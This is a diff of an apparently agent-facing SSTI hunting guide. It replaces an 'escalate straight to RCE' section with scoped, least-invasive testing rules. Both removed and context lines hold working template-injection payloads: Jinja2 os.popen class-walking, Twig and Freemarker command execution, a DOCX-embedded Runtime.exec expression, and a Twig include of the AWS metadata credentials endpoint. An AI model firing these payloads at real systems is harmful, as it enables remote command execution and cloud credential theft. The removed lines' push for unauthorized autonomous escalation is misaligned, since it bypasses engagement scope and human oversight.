@@ -31,27 +31,19 @@ report_count: 6
 >
 > Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.
 
-## Autonomous Testing Priority
+## Controlled testing priority
 
-**Escalate straight to RCE — don't stop at arithmetic detection.**
+Start with harmless, uniquely marked engine-specific probes and a negative control
+inside the written scope. Arithmetic evaluation can support SSTI but does not
+alone identify an engine or prove command execution. Fingerprint from actual
+behavior/configuration before choosing version-specific payloads; reflected text
+may be literal, escaped, transformed or evaluated in another context.
 
-Arithmetic probes (`{{7*7}}→49`) confirm the injection point but are not proof of impact. The real goal is OS command execution. Arithmetic detection also fails silently when the app echoes the input back (e.g. inside an HTML attribute like `<input value="{{7*7}}">`), producing a false negative even when injection exists.
-
-**Order of attack:**
-1. **Try Jinja2 RCE first** (covers Python/Flask — the most common stack in modern web apps):
-   ```
-   {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
-   ```
-2. **If the endpoint is a traditional web form**, send as form-encoded body — NOT JSON:
-   ```
-   Content-Type: application/x-www-form-urlencoded
-   field={{config.__class__.__init__.__globals__['os'].popen('id').read()}}
-   ```
-   JSON bodies are silently ignored by form-processing endpoints (`request.form['field']` sees nothing).
-3. **If Jinja2 fails**, try Twig (PHP/Symfony): `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`
-4. **Fall back to arithmetic detection** only to fingerprint the engine when RCE payloads fail.
-
-**Proof:** Command output (`uid=N(user) gid=...`) in the response confirms RCE. If the output appears in HTML (inside a `<div>` or `<pre>`), that still counts — the format is irrelevant, the content is the evidence.
+Do not automatically escalate to RCE, OOB requests, stored templates or outbound
+email. Stop at the least invasive proof sufficient for the engagement. Additional
+execution, persistence or messages require explicit matching scope and a safe lab
+or test account, approved collector and cleanup plan. Preserve/redact evidence;
+do not access cloud metadata credentials or other users' data to prove impact.
 
 ---
 
@@ -135,7 +127,7 @@ preview). PortSwigger's *"SSTI using documentation"* class is this shape. Three 
 
 ## Related Skills & Chains
 
-- **`hunt-rce`** — SSTI is the easiest path to RCE on Python/Ruby/PHP/Java stacks because the template language already exposes the runtime. Chain primitive: Jinja2 `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` or Freemarker `<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}` → unauthenticated RCE as the rendering worker. Always escalate fingerprint → class-walker → cmd exec.
+- **`hunt-rce`** — SSTI is the easiest path to RCE on Python/Ruby/PHP/Java stacks because the template language already exposes the runtime. Chain primitive: Jinja2 `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` or Freemarker `<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}` → unauthenticated RCE as the rendering worker. Escalate only when that effect is explicitly authorized and needed for the agreed evidence.
 - **`hunt-xss`** — When the template engine sandboxes the runtime (or you only get the rendered output back as HTML), the same `{{7*7}}` reflection often still yields stored XSS. Chain primitive: sandboxed Jinja2 SSTI without escapes → inject `<script>` into rendered email template → stored XSS hitting every recipient who views the message.
 - **`hunt-ssrf`** — Template engines often expose URL fetchers/filters before they expose the runtime, giving you SSRF before RCE. Chain primitive: Twig `{{ include('http://169.254.169.254/latest/meta-data/iam/security-credentials/') }}` or Jinja2 with `url_for`/custom filters → AWS metadata exfil → cloud creds.
 - **`hunt-file-upload`** — Office docs, SVGs, and email templates uploaded by the user are common SSTI surfaces (the server re-renders them). Chain primitive: upload a DOCX whose `word/document.xml` contains `${T(java.lang.Runtime).getRuntime().exec("id")}` to a Velocity/Freemarker-driven mail-merge → RCE.
